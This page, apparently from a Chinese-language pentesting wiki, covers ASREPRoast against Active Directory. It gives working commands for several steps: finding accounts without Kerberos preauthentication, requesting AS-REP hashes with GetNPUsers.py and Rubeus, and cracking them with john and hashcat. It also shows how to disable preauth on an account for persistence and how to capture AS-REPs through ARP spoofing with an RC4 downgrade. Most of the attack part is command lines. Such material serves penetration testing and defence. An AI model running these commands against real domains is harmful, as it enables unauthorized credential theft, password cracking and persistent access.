# ASREPRoast

{{#include ../../banners/hacktricks-training.md}}

<figure><img src="../../images/image (3).png" alt=""><figcaption></figcaption></figure>

加入 [**HackenProof Discord**](https://discord.com/invite/N3FrSbmwdy) 服务器，与经验丰富的黑客和漏洞赏金猎人交流！

**黑客洞察**\
参与深入探讨黑客的刺激与挑战的内容

**实时黑客新闻**\
通过实时新闻和见解，跟上快速变化的黑客世界

**最新公告**\
了解最新的漏洞赏金计划和重要平台更新

**加入我们** [**Discord**](https://discord.com/invite/N3FrSbmwdy)，今天就开始与顶级黑客合作吧！

## ASREPRoast

ASREPRoast 是一种安全攻击，利用缺乏 **Kerberos 预身份验证所需属性** 的用户。基本上，这个漏洞允许攻击者向域控制器 (DC) 请求用户的身份验证，而无需用户的密码。然后，DC 会用用户的密码派生密钥加密的消息进行响应，攻击者可以尝试离线破解以发现用户的密码。

此攻击的主要要求是：

- **缺乏 Kerberos 预身份验证**：目标用户必须未启用此安全功能。
- **连接到域控制器 (DC)**：攻击者需要访问 DC 以发送请求并接收加密消息。
- **可选的域账户**：拥有域账户可以让攻击者通过 LDAP 查询更有效地识别易受攻击的用户。没有这样的账户，攻击者必须猜测用户名。

#### 枚举易受攻击的用户（需要域凭据）
```bash:Using Windows
Get-DomainUser -PreauthNotRequired -verbose #List vuln users using PowerView
```

```bash:Using Linux
bloodyAD -u user -p 'totoTOTOtoto1234*' -d crash.lab --host 10.100.10.5 get search --filter '(&(userAccountControl:1.2.840.113556.1.4.803:=4194304)(!(UserAccountControl:1.2.840.113556.1.4.803:=2)))' --attr sAMAccountName
```
#### 请求 AS_REP 消息
```bash:Using Linux
#Try all the usernames in usernames.txt
python GetNPUsers.py jurassic.park/ -usersfile usernames.txt -format hashcat -outputfile hashes.asreproast
#Use domain creds to extract targets and target them
python GetNPUsers.py jurassic.park/triceratops:Sh4rpH0rns -request -format hashcat -outputfile hashes.asreproast
```

```bash:Using Windows
.\Rubeus.exe asreproast /format:hashcat /outfile:hashes.asreproast [/user:username]
Get-ASREPHash -Username VPN114user -verbose #From ASREPRoast.ps1 (https://github.com/HarmJ0y/ASREPRoast)
```
> [!WARNING]
> 使用 Rubeus 进行 AS-REP Roasting 将生成一个 4768，加密类型为 0x17，预身份验证类型为 0。

### 破解
```bash
john --wordlist=passwords_kerb.txt hashes.asreproast
hashcat -m 18200 --force -a 0 hashes.asreproast passwords_kerb.txt
```
### 持久性

强制 **preauth** 对于您拥有 **GenericAll** 权限（或写入属性的权限）的用户不是必需的：
```bash:Using Windows
Set-DomainObject -Identity <username> -XOR @{useraccountcontrol=4194304} -Verbose
```

```bash:Using Linux
bloodyAD -u user -p 'totoTOTOtoto1234*' -d crash.lab --host 10.100.10.5 add uac -f DONT_REQ_PREAUTH
```
## 无凭证的ASREProast

攻击者可以利用中间人位置捕获AS-REP数据包，因为它们在网络中传输，而不依赖于Kerberos预身份验证被禁用。因此，它适用于VLAN上的所有用户。\
[ASRepCatcher](https://github.com/Yaxxine7/ASRepCatcher) 允许我们这样做。此外，该工具通过更改Kerberos协商强制客户端工作站使用RC4。
```bash
# Actively acting as a proxy between the clients and the DC, forcing RC4 downgrade if supported
ASRepCatcher relay -dc $DC_IP

# Disabling ARP spoofing, the mitm position must be obtained differently
ASRepCatcher relay -dc $DC_IP --disable-spoofing

# Passive listening of AS-REP packets, no packet alteration
ASRepCatcher listen
```
## 参考

- [https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/as-rep-roasting-using-rubeus-and-hashcat](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/as-rep-roasting-using-rubeus-and-hashcat)

---

<figure><img src="../../images/image (3).png" alt=""><figcaption></figcaption></figure>

加入 [**HackenProof Discord**](https://discord.com/invite/N3FrSbmwdy) 服务器，与经验丰富的黑客和漏洞赏金猎人交流！

**黑客洞察**\
参与深入探讨黑客的刺激与挑战的内容

**实时黑客新闻**\
通过实时新闻和见解，跟上快速变化的黑客世界

**最新公告**\
了解最新的漏洞赏金发布和重要平台更新

**加入我们** [**Discord**](https://discord.com/invite/N3FrSbmwdy)，今天就开始与顶尖黑客合作吧！

{{#include ../../banners/hacktricks-training.md}}
